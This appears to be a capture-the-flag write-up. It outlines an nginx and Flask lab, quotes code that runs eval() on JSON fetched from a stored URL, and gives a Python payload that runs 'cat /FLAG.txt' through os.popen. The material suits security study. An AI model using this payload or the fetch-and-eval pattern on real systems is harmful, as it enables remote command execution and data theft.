**Attack chain summary:**

1. **Architecture**: nginx (port 80) acts as a reverse proxy and key-value store (via njs). `flask_app:8080` is the vulnerable Flask app. `flask_api:8081` returns a JSON `{"script": "'OK ' * 4"}`.

2. **Vulnerability**: In `flask_app/app.py:11`:
   ```python
   api = requests.get('http://nginx/api/get').text  # gets stored URL
   script = requests.get(api).text                   # fetches from that URL
   eval_result = eval(json.loads(script)["script"])  # UNSAFE eval!
   ```

3. **Exploit**: Set the API URL to a malicious server on the same Docker network returning `{"script": "__import__('os').popen('cat /FLAG.txt').read()"}`. The `eval()` executes it on the flask_app container, reading `/FLAG.txt`.
